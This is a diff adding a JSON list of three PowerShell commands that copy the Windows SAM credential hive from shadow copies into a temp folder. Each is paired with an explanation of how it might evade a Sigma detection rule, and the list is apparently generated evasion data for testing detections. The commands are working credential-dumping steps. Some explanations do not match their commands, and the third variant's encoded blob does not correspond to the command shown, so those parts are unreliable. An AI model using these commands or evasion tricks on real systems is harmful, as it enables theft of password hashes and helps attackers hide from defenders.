@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"1..10 | ForEach-Object { try { [System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM', '$env:TEMP\\SAMvss$_', 'true') } catch {} }\"",
+    "explanation": "Reordering and substitution of syntax (%% to ForEach-Object) may avoid matching the suspicious string 'Copy-Item' or 'cp $_.' in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"1..10 | %% { try { [System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM', '$env:TEMP\\SAMvss$_', 'true') } catch {} }\"",
+    "explanation": "Insertion of quotes and escape characters may prevent the Sigma rule from detecting the exact string pattern in the command line."
+  },
+  {
+    "output": "powershell.exe -Command \"1..10 | %% { try { [System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM', '$env:TEMP\\SAMvss$_', 'true') } catch {} }\" -EncodedCommand JABwAG8Ac3BvcA==",
+    "explanation": "Encoding the command may prevent the Sigma rule from detecting the exact string pattern in the command line."
+  }
+]
